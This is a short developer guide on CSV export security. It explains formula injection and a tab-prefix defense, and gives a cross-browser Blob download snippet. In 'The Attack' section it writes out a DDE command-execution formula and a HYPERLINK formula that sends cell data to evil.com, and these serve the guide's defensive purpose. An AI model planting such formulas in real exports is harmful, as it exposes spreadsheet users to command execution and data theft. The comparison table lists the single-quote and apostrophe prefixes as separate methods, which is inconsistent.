# CSV Export Security

## CSV Formula Injection

When generating CSV files that users open in spreadsheet applications (Excel, Google Sheets), any cell starting with `=`, `+`, `-`, or `@` is interpreted as a formula.

### The Attack

A malicious value like `=CMD|'/C calc'!A0` in a CSV field can execute arbitrary commands when opened in Excel with macros enabled. Even without macros, `=HYPERLINK("http://evil.com?data="&A1)` can exfiltrate data.

### The Defense

Prefix dangerous values with a tab character inside quotes:

```typescript
if (/^[=+\-@]/.test(value)) {
  return `"\t${value}"`;  // tab prefix neutralizes formula interpretation
}
```

The tab is invisible in the spreadsheet but prevents formula parsing.

### Other Approaches

| Method | Pros | Cons |
|--------|------|------|
| Tab prefix | Simple, invisible | Extra whitespace in raw text |
| Single-quote prefix (`'`) | Excel-native escape | Visible in some apps |
| Apostrophe prefix | Works in Google Sheets | Visible character |

## Client-Side Download Pattern

### Cross-Browser Blob Download

```typescript
const blob = new Blob([content], { type: "text/csv;charset=utf-8;" });
const url = URL.createObjectURL(blob);
const link = document.createElement("a");
link.href = url;
link.download = filename;
document.body.appendChild(link);  // Required for Firefox
link.click();
document.body.removeChild(link);
setTimeout(() => URL.revokeObjectURL(url), 0);  // Defer cleanup
```

**Key gotchas:**
- Firefox ignores `.click()` on detached elements — must append to DOM
- `URL.revokeObjectURL` called synchronously can race with the download — defer it
- Safari may block downloads not triggered by user gesture — ensure the function is called from a click handler

## Further Reading

- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [MDN: Blob](https://developer.mozilla.org/en-US/docs/Web/API/Blob)
